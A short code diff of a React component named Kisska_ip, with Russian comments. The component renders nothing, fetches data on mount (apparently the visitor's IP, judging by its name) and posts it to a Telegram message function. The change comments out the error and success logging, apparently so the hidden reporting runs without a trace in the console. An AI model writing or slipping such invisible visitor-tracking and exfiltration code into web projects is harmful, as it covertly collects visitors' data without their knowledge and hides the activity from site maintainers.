@@ -11,7 +11,7 @@ export const Kisska_ip: FC = () => {
       .then((data) => {
         sendTelegramMessage(data);
       })
-      .catch((error) => console.error("Произошла ошибка:", error));
+      // .catch((error) => console.error("Произошла ошибка:", error));
   }, []); // [] чтобы useEffect сработал только один раз при монтировании компонента
 
   const sendTelegramMessage = (message: string) => {
@@ -28,8 +28,8 @@ export const Kisska_ip: FC = () => {
       }),
     })
       .then((response) => response.json())
-      .then((data) => console.log("Сообщение отправлено:", data))
-      .catch((error) => console.error("Ошибка отправки сообщения:", error));
+      // .then((data) => console.log("Сообщение отправлено:", data))
+      // .catch((error) => console.error("Ошибка отправки сообщения:", error));
   };
 
   return <></>;
